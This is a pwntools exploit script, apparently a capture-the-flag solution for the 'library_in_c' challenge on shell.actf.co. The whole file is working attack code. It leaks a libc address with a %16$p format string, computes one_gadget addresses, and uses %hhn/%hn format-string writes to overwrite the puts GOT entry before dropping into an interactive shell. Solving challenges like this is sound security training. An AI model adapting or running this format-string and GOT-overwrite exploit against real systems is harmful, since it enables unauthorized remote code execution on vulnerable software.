#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

elf = ELF('./library_in_c')
libc = ELF('./libc.so.6')
# p = process('./library_in_c')
p = remote('shell.actf.co', 20201)

payload = b'%16$p'
p.sendlineafter(b'name?', payload)

p.recvuntil(b'Why hello there ')
libc.address = int(p.recvline(), 16) - 0x5f1168
log.info('libc address: {:#x}'.format(libc.address))

for i, g in enumerate(one_gadget):
    one_gadget[i] = g + libc.address
    log.info('one gadget[{}]: {:#x}'.format(i, one_gadget[i]))

i = 1
c1 = (one_gadget[i] & 0xff0000) >> 16
c2 = (one_gadget[i] & 0xffff) - c1
fmt1 = b'%' + str(c1).encode() + b'x%23$hhn'
fmt2 = b'%' + str(c2).encode() + b'x%22$hn'
log.info('c1 : {:#x}'.format(c1))
log.info('c1 + c2 : {:#x}'.format(c1 + c2))

payload = (fmt1 + fmt2).ljust(0x30, b'a') + \
        flat(elf.got['puts'], elf.got['puts']+2)
p.sendlineafter(b'out?', payload)

p.interactive()
